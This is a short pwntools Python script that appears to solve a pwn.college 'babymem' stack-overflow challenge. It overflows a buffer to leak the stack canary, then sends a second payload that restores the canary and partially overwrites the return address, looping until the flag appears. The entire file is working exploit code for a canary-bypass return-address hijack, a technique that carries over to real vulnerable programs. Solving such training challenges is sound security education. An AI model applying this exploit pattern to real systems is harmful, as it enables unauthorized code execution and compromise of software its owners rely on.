from pwn import *

context.arch = 'amd64'
# 启动进程

while True :
    p = process('/challenge/babymem_level14.1')
    
    # dump stack
    payload = b'REPEAT' + b'A' * (184 - len('REPEAT')) +b'B'  
    p.recvuntil('Payload size:')
    p.sendline(b'185') 
    p.send(payload)

    # 从程序的输出中获取 Canary 值
    p.recvuntil('You said: ')
    response = p.recvline()
    print(response)
    Canary = response[185:192]  # 7个字节
    
    print(f"Canary value: {Canary.hex()}")
    print(Canary)
    Canary=b'\x00'+Canary
    print(f"Modified Canary value: {Canary.hex()}")
    
    payload = b'A' * 456 + Canary + b'B' * 8 + p16(0x17F5)
    print(payload)
    p.recvuntil('Payload size:')
    p.sendline(b'474')
    p.send(payload)
   
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break
    #break 
    # addr 19B7


